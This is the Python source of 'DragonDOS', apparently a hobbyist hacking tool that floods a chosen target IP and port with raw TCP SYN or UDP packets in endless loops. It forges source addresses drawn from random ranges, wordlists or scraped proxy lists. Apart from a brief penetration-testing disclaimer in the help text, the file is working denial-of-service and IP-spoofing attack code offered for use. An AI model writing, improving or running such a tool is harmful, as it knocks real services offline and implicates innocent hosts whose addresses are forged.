#!/usr/bin/python3
#-*- coding: utf-8 -*-
#DragonDOS.py

author = "G4LD0R - https://github.com/G4LD0R"

import socket
import struct, sys
import subprocess
import random
import binascii
import os
from time import sleep
import ip_generators

#colors
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
LIGHTBLUE = '\033[0;96m'
DARKYELLOW = '\033[33m'
FLASH = '\033[5m'
DARKGREEN = '\033[92m'

os.system("clear")
_banner_ = '''                                                      ,   .
           `.                                               `. ,;
            Y.                                   ,oo8""      :oo
             8.                                ,d88"         :88
             `8.                         ,o. ,o88P          ,dP
              :8                      ,d888P,8888 ,od8ooood8"'
   `.          Y8.            ,-..,o888P"Y88888P8P"'  `""'
    `b.         Y8.          (  `Y88888b.d888888o.   ,
     `Hb.        Y8.           ,""88888888888888888P"       ,-
       "8bo       Y8o         ( :8888888888888""           db    ,-
         Y88o      Y8b.         `888888"""HBN'             888' :88;
          `"88o.   ,Y88o        :88888'                   Y8P ,d8"'
             "88b. `8d88b.      :88888                    :8 ,88;  ,
`"oo.          "888.`88888o     :8888b                    d8b88P,od88"'
   `"888oo.888888`Y888888888.888888888b888888888888888888,888888888P'
                {1}============================================{0}
               {1} |{0}     {7}DRAGON IP SPOOFING & DOS TOOL{0}	  {1} |{0}
	{1}+===========================================================+{0}
	{1}|{0} {3}Dragon Created By{0}{4}	:	{0}Hasan BASKIN	( G4LD0R )  {1}|{0}
	{1}|{0} {3}Version{0}{4}		:	{0}1.0	                    {1}|{0}
	{1}|{0} {3}C0dename{0}{4}		:	{0}HBN			   {1} |{0}
	{1}|{0} {3}Follow me on Github{0}{4}	:	{0}https://github.com/G4LD0R  {1} |{0} 
	{1}|{0} {3}Website{0}{4}		:	{0}www.hasanbaskin.com	   {1} |{0}
	{1}+===========================================================+{0}
'''.format(ENDC, FAIL, WARNING, HEADER, BOLD, OKBLUE, OKGREEN, FLASH )


first_options = '''
		{2}[{0}1{2}]{0} Basic Attack		{2}[{0}7{2}]{0} Help
		{2}[{0}2{2}]{0} Specific Attack		{2}[{0}0{2}]{0} Exit
		{2}[{0}3{2}]{0} Network Scanner	

'''.format(ENDC, DARKYELLOW, FAIL, )


#Built IP Header
def built_ip_header(protocol, srcip, destip, identification=54321):

	source_adress = socket.inet_aton(srcip)
	destination_address = socket.inet_aton(destip)
	ihl_version = (4 << 4) | 5
	data = struct.pack('!BBHHHBBH4s4s',ihl_version, 0, 0, identification, 0, 77, protocol, 1, source_adress, destination_address)

	return data

#Built TCP Header
def built_tcp_header(srcport, dstport, payload, seq=456, ackseq=0, window_size=5840):

	offset_res = (5 << 4) | 0
	flags = 2
	checksum = 0
	urg_pointer = 0
	data = struct.pack('!HHLLBBHHH', srcport, dstport, seq, ackseq, offset_res,flags, window_size, checksum, urg_pointer)

	return data

#Built UDP Header
def built_udp_header(srcport, dstport, length=8, checksum=0x7c12):

	data = struct.pack('!HHHH', srcport, dstport, length, checksum)

	return data

#IP Format Control
def ip_type_contoller(ipAddress):
		
	try:
		a,b,c,d = ipAddress.split('.')

		reply = True
		if not (0 <= int(a) <= 255):
			reply = False		
		if not (0 <= int(b) <= 255):
			repyle = False
		if not (0 <= int(c) <= 255):
			reply = False
		if not (0 <= int(d) <= 255):
			reply = False

		return reply

	except:
		return False

#Port Range Control
def port_controller(portNo):
	if (0 < int(portNo) <= 65535):
		return True
	else:
		return False

#Source IP Choice
def wordlist_choicer():
	os.system("clear")
	print(_banner_)
	print("""
	+---------------------------------------------------------------+

	{2}[{1}?{2}]{3} Please choose a method to generate source ip addresses.

		{2}[{0}1{2}]{0} Own Ip Addresses	{2}[{0}3{2}]{0} Actual Proxy IP Addresses
		{2}[{0}2{2}]{0} Current Wordlist	{2}[{0}4{2}]{0} Random IP Addresses

	""".format(ENDC, OKGREEN, FAIL, LIGHTBLUE))
	wordlist_chc = input("\n{3}[{2}?{3}]{0} Choose{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))

	return wordlist_chc

#TCP & UDP Choice
def protocol_choicer():

	os.system("clear")
	print(_banner_)
	print("""
	+---------------------------------------------------------------+

	{2}[{1}?{2}]{3} Please choose a packet type.

		{2}[{0}T{2}]{0} Use TCP Packets	
		{2}[{0}U{2}]{0} Use UDP Packets	

	""".format(ENDC, OKGREEN, FAIL, LIGHTBLUE))
	packet_type = input("\n{3}[{2}?{3}]{0} Choose{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))

	if (packet_type == "t") | (packet_type == "T"):
		return "T"
	elif (packet_type == "u") | (packet_type == "U"):
		return "U"
	
	
#Call the progressbar
def prog_bar(name):
	print("")
	def progressbar(it, prefix="",size=60, file=sys.stdout):
	    count = len(it)
	    def show(j):
	        x = int(size*j/count)
	        file.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "."*(size-x), j*5, 100))
	        file.flush()        
	    show(0)
	    for i, item in enumerate(it):
	        yield item
	        show(i+1)
	    file.write("\n")
	    file.flush()


	for i in progressbar(range(20), name , 40):
	    sleep(0.1) # any calculation you need


help_message ="""
\a{1}\t\t\tWarning!\n\nThis script only created to uses on penetration tests. \nOnly the users be responsible when occurred an abuse.{0}

This script consist of volume-based dos attacks and protocol attacks.
You can choose one of two options. Those are options 1 or option 2.
This program performs IP Spoofing also. (You must use the second option for this)

{2}[1] Basic Attack Type {0}
This Attack type performs with random IP addresses and TCP packets. \nit takes simply destination IP address and destination port number from the user. Then it start the attack.

{2}[2] Specific Attack Type{0}

This attack-type contains different options. You can use wordlist files, random IP addresses, your own IP address for the source IP address. 
Additionally, you can use real IP addresses toke from free proxy websites. This program can perform all of them for you.
You can choose the protocol type according to how you want between TCP packets and UDP packets.

This version is only a start-up.\nI continue developing this script.\nI hope this usefully for you.

{2}If you want to contact me, you should send a mail.
>> info@hasanbaskin.com << {0}


""".format(ENDC, FAIL, UNDERLINE)

def DragonDos():
	# Built Raw Socket & Call the generator class & Counter
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	generate = ip_generators.generator()
	packet_counter = 0


	try:
		#Start..
		print(_banner_)
		print(first_options)
		_attack_type_ = input("\n{3}[{2}*{3}]{0} Choose{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))


		#Options And Attack
		#Default Attack
		if _attack_type_ == "1":

			ip_controlled = False
			while ip_controlled == False:
				os.system("clear")
				print(_banner_)
				_dst_ip_address = input("\n{3}[{2}*{3}]{0} Target IP{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))
				ip_controlled = ip_type_contoller(_dst_ip_address)
				if not ip_controlled:
					print(FAIL+"[!] IP address syntax error !\tExample: 192.168.1.7"+ENDC)
					sleep(2)
			
			port_controlled = False
			while port_controlled == False:
				os.system("clear")
				print(_banner_)
				_dst_port_number = int(input("\n{3}[{2}*{3}]{0} Target Port{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL)))
				port_controlled = port_controller(_dst_port_number)
				if not port_controlled:
					print(FAIL+"[!] This Port is not available !\t[1-65535]"+ENDC)
					sleep(2)

			try:
				prog_bar("Starting Attack :")
				while True:
					_spoof_ip_ = generate.random_ip()		
					ip_header =built_ip_header(socket.IPPROTO_TCP, _spoof_ip_, _dst_ip_address)
					tcp_header = built_tcp_header(7777, _dst_port_number, "keskinpusat")
					packet = ip_header + tcp_header
					s.sendto(packet, (_dst_ip_address, 0))
					packet_counter +=1
					print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_)+ENDC)

			except socket.error:
				print(FAIL+"Socket Er ! \nProgram is Ending - Bye..."+ENDC)
				sys.exit()

			except KeyboardInterrupt:
				print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
				sys.exit()
			
		#Special Attack
		elif _attack_type_ == "2":

			ip_controlled = False
			while ip_controlled == False:
				os.system("clear")
				print(_banner_)
				_dst_ip_address = input("\n{3}[{2}*{3}]{0} Target IP{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))
				ip_controlled = ip_type_contoller(_dst_ip_address)
				if not ip_controlled:
					print(FAIL+"[!] IP address syntax error !\tExample: 192.168.1.7"+ENDC)
					sleep(2)
			port_controlled = False
			while port_controlled == False:
				os.system("clear")
				print(_banner_)
				_dst_port_number = int(input("\n{3}[{2}*{3}]{0} Target Port{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL)))
				port_controlled = port_controller(_dst_port_number)
				if not port_controlled:
					print(FAIL+"[!] This Port is not available !\t[1-65535]"+ENDC)
					sleep(2)


			_wrd_ = wordlist_choicer()	#Input Wordlist Path
			_type_ = protocol_choicer()	#Choose the protocol type [TCP & UDP]

			#Use own ip addresees to attack
			if _wrd_ == "1":		
				#Type: TCP
				if _type_ == "T":
					prog_bar("Starting Attack :")
					while True:
						try:
							_spoof_ip_address = generate.own_ip()
							packet_counter +=1
							ip_header = built_ip_header(socket.IPPROTO_TCP, _spoof_ip_address, _dst_ip_address)
							tcp_header = built_tcp_header(7777, _dst_port_number, "keskinpusat" )
							packet = ip_header + tcp_header
							s.sendto(packet,(_dst_ip_address, 0))
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error ! \nProgram is Ending - Bye..."+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()
				#Type: UDP
				elif _type_ == "U":
					prog_bar("Starting Attack :")
					while True:				
						try:
							_spoof_ip_address = generate.own_ip()				
							ip_header = built_ip_header(socket.IPPROTO_UDP, _spoof_ip_address, _dst_ip_address)
							udp_header = built_udp_header(random.randint(1024, 65535), _dst_port_number)
							packet = ip_header + udp_header
							s.sendto(packet, (_dst_ip_address, 0))
							packet_counter +=1
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error !"+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()

				else:
					print(FAIL+"Wrong Choice ! Bye...")
					sys.exit()

			#Use wordlist for source IP addresses
			elif _wrd_ == "2":
				os.system("clear")
				print(_banner_)
				_path_ = input("\n{3}[{2}*{3}]{0} Path of Wordlist{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))
				prog_bar("Opening Wordlist :")
				#Type: TCP
				if _type_ == "T":
					prog_bar("Starting Attack :")
					while True:
						try:
							_spoof_ip_address = generate.read_from_wordlist(_path_)
							packet_counter +=1
							ip_header = built_ip_header(socket.IPPROTO_TCP, _spoof_ip_address, _dst_ip_address)
							tcp_header = built_tcp_header(7777, _dst_port_number, "keskinpusat" )
							packet = ip_header + tcp_header
							s.sendto(packet,(_dst_ip_address, 0))
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error ! \nProgram is Ending - Bye..."+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()
				#Type UDP
				elif _type_ == "U":
					prog_bar("Starting Attack :")
					while True:				
						try:
							_spoof_ip_address = generate.read_from_wordlist(_path_)				
							ip_header = built_ip_header(socket.IPPROTO_UDP, _spoof_ip_address, _dst_ip_address)
							udp_header = built_udp_header(random.randint(1024, 65535), _dst_port_number)
							packet = ip_header + udp_header
							s.sendto(packet, (_dst_ip_address, 0))
							packet_counter +=1
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error !"+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()

				else:
					print(FAIL+"Wrong Choice ! Bye...")
					sys.exit()

			#Use Actual Proxy IP Addreses
			if _wrd_ == "3":
				reelipList = generate.fetch_actual_ips()
				prog_bar("Fetch the Ipaddresses from web :")
				#Type: TCP
				if _type_ == "T":
					prog_bar("Starting Attack :")
					while True:
						try:
							_spoof_ip_address = random.choice(reelipList)
							ip_header = built_ip_header(socket.IPPROTO_TCP, _spoof_ip_address, _dst_ip_address)
							tcp_header = built_tcp_header(7777, _dst_port_number, "keskinpusat")
							packet = ip_header + tcp_header
							s.sendto(packet, (_dst_ip_address, 0))
							packet_counter +=1
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error ! \nProgram is Ending - Bye..."+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()
				#Type: UDP
				elif _type_ == "U":
					prog_bar("Starting Attack :")
					while True:
						try:
							_spoof_ip_address = random.choice(reelipList)
							ip_header = built_ip_header(socket.IPPROTO_UDP, _spoof_ip_address, _dst_ip_address)
							udp_header = built_udp_header(random.randint(1024, 65535), _dst_port_number)
							packet = ip_header + udp_header
							s.sendto(packet, (_dst_ip_address, 0))
							packet_counter +=1
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error ! \nProgram is Ending - Bye..."+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()


			#Use random IP Addresses
			if _wrd_ == "4":

				ip_controlled = False
				while ip_controlled == False:
					os.system("clear")
					print(_banner_)
					_sample_spf_ip= input("\n{3}[{2}?{3}]{0} Sample Spoof IP{1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))				
					ip_controlled = ip_type_contoller(_sample_spf_ip)
					if not ip_controlled:
						print(FAIL+"IP address syntax error !\tExample: 192.168.1.7"+ENDC)

				ip_controlled = False
				while ip_controlled == False:
					os.system("clear")
					print(_banner_)
					_netmask_= input("\n{3}[{2}*{3}]{0} Netmask for Spoof Ip Addresses (Default: 255.255.255.0){1} >> {2}".format(WARNING, LIGHTBLUE,ENDC, FAIL))
					ip_controlled = ip_type_contoller(_netmask_)
					if not ip_controlled:
						print(FAIL+"IP address syntax error !\tExample: 192.168.1.7"+ENDC)


				#Type: TCP
				if _type_ == "T":
					prog_bar("Starting Attack :")
					while True:
						try:				
							_spoof_ip_address = str(generate.random_ip(_sample_spf_ip, _netmask_))
							packet_counter +=1
							ip_header = built_ip_header(socket.IPPROTO_TCP, _spoof_ip_address, _dst_ip_address)
							tcp_header = built_tcp_header(7777, int(_dst_port_number), "keskinpusat" )
							packet = ip_header + tcp_header
							s.sendto(packet,(_dst_ip_address, 0))
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error ! \nProgram is Ending - Bye..."+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()
				#Type: UDP
				elif _type_ == "U":
					prog_bar("Starting Attack :")
					while True:
						try:				
							_spoof_ip_address = generate.random_ip(_sample_spf_ip, _netmask_)
							ip_header = built_ip_header(socket.IPPROTO_UDP, _spoof_ip_address, _dst_ip_address)
							udp_header = built_udp_header(random.randint(1024, 65535), _dst_port_number)
							packet = ip_header + udp_header
							s.sendto(packet, (_dst_ip_address, 0))
							packet_counter +=1
							print(OKGREEN+"Send {0} packet to {1} from {2}".format(packet_counter, _dst_ip_address, _spoof_ip_address)+ENDC)
						except socket.error:
							print(FAIL+"Socket Error !"+ENDC)
							sys.exit()
						except KeyboardInterrupt:
							print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
							sys.exit()

		elif _attack_type_ == "3":
			prog_bar('Starting Network Scan: ')
			scan = subprocess.run(['python','networkScanner.py'])
			if scan.returncode == 0:
				print("\n{1}[{2}+{1}]{0} Network Scan Completed.".format(ENDC, FAIL, OKGREEN))
			input("\n{1}[{0}*{1}]{2} Press ENTER For Continue {3}>>>{0}".format(ENDC, FAIL, WARNING, LIGHTBLUE))
			os.system("clear")
			DragonDos()


		elif _attack_type_ == "7":
			os.system("clear")
			print(help_message)
			input("\nPress ENTER For Continue >> ")
			os.system("clear")
			DragonDos()

		elif _attack_type_ == "0":
			print(FAIL+"Exiting...")
			sys.exit()

		else:
			print("{1}[{0}X{1}]{0} Wrong Choice !".format(ENDC, FAIL))
			DragonDos()
	except KeyboardInterrupt:
		print(FAIL+"\nProgram is Terminating - Bye ..."+ENDC)
		sys.exit()


if __name__ == "__main__":
	DragonDos()






